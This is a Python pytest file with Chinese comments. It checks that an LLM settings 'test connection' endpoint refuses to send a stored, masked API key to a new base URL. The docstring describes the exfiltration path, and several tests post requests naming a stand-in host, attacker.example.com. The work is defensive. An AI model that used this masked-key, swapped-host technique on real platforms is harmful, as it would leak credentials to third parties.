# -*- coding: utf-8 -*-
"""不变式：库里的密钥只能发往库里的目的地。

「掩码 = 沿用已存密钥」这个约定对 PUT 是对的——PUT 时目的地也一并落库，
密钥与目的地始终配对。但「测试连接」不同：目的地是临时的、完全由请求方决定，
配对关系在这里断了。

于是只要提交 {base_url: 攻击者地址, api_key: 界面上拿到的掩码}，平台就把真实
明文密钥当 Bearer 发过去——**不需要构造任何异常输入，用界面本身的数据流就能触发**。
"""
import json

import pytest
from fastapi.testclient import TestClient

from app.db import database as db

API = "/api/v1"
REAL_KEY = "sk-exfil-probe-0123456789abcdef"
OWN_HOST = "https://api.moonshot.example/v1"
ATTACKER = "https://attacker.example.com/v1"


@pytest.fixture
def configured(admin_client: TestClient):
    """先把平台配好一把真密钥。"""
    r = admin_client.put(
        f"{API}/settings/llm",
        json={"base_url": OWN_HOST, "api_key": REAL_KEY, "model": "probe-model",
              "temperature": 0.3, "max_output_tokens": 4096, "context_window": 131072},
    )
    assert r.status_code == 200, r.text
    masked = r.json()["api_key"]
    assert masked and masked != REAL_KEY, "GET/PUT 返回的必须是掩码"
    return masked


def test_masked_key_cannot_be_sent_to_another_host(admin_client, configured) -> None:
    """核心：掩码 + 换 host = 拒绝。这正是攻击路径。"""
    r = admin_client.post(
        f"{API}/settings/llm/test",
        json={"base_url": ATTACKER, "api_key": configured, "model": "probe-model"},
    )
    assert r.status_code == 400, "换了 host 又不给真密钥，必须拒绝"
    assert "API Key" in r.json()["detail"]


def test_empty_key_cannot_be_sent_to_another_host(admin_client, configured) -> None:
    """留空同样是「沿用已存」，同样不许换 host。"""
    r = admin_client.post(
        f"{API}/settings/llm/test",
        json={"base_url": ATTACKER, "api_key": "", "model": "probe-model"},
    )
    assert r.status_code == 400


def test_omitted_key_cannot_be_sent_to_another_host(admin_client, configured) -> None:
    """连字段都不给，也不能换 host。"""
    r = admin_client.post(
        f"{API}/settings/llm/test",
        json={"base_url": ATTACKER, "model": "probe-model"},
    )
    assert r.status_code == 400


def test_same_host_different_path_is_allowed(admin_client, configured, monkeypatch) -> None:
    """同一供应商换路径/版本是常见合法操作，不能误伤。"""
    from app.services import llm as llm_service
    from app.models.settings import LlmTestResult

    async def fake_test(override=None):
        return LlmTestResult(ok=True, model="probe-model", latency_ms=1)

    monkeypatch.setattr(llm_service, "test_llm", fake_test)

    r = admin_client.post(
        f"{API}/settings/llm/test",
        json={"base_url": "https://api.moonshot.example/v1beta",
              "api_key": configured, "model": "probe-model"},
    )
    assert r.status_code == 200, "同 host 改路径应当放行"


def test_new_host_with_real_key_is_allowed(admin_client, configured, monkeypatch) -> None:
    """自带真密钥测新地址是正当用法——真实场景就是任意中转。"""
    from app.services import llm as llm_service
    from app.models.settings import LlmTestResult

    async def fake_test(override=None):
        return LlmTestResult(ok=True, model="probe-model", latency_ms=1)

    monkeypatch.setattr(llm_service, "test_llm", fake_test)

    r = admin_client.post(
        f"{API}/settings/llm/test",
        json={"base_url": ATTACKER, "api_key": "sk-a-different-real-key-000",
              "model": "probe-model"},
    )
    assert r.status_code == 200, "自带密钥测任意地址必须仍然可用"


def test_external_test_is_audited(admin_client, configured, monkeypatch) -> None:
    """打到外部地址要留痕，但痕里不能有密钥。"""
    from app.services import llm as llm_service
    from app.models.settings import LlmTestResult

    async def fake_test(override=None):
        return LlmTestResult(ok=True, model="probe-model", latency_ms=1)

    monkeypatch.setattr(llm_service, "test_llm", fake_test)
    admin_client.post(
        f"{API}/settings/llm/test",
        json={"base_url": ATTACKER, "api_key": "sk-a-different-real-key-000",
              "model": "probe-model"},
    )

    rows = db.query_all(
        "SELECT * FROM audit_log WHERE action='settings_test_external' ORDER BY rowid DESC LIMIT 5"
    )
    assert rows, "打到外部地址必须留痕，否则导出尝试只能靠代码审计才能发现"
    detail = json.loads(dict(rows[0])["detail_json"] or "{}")
    assert detail.get("base_url") == ATTACKER

    blob = " ".join(str(dict(r)) for r in db.query_all("SELECT * FROM audit_log"))
    assert REAL_KEY not in blob
    assert "sk-a-different-real-key" not in blob


def test_embedding_and_image_share_the_invariant(admin_client) -> None:
    """三个 test 端点共用同一个清洗函数，不该只堵住其中一个。"""
    admin_client.put(
        f"{API}/settings/embedding",
        json={"enabled": True, "base_url": OWN_HOST, "api_key": REAL_KEY,
              "model": "emb", "dim": 1024},
    )
    r = admin_client.post(
        f"{API}/settings/embedding/test",
        json={"base_url": ATTACKER, "api_key": "sk-***cdef", "model": "emb"},
    )
    assert r.status_code == 400, "embedding 的测试端点必须同样受约束"
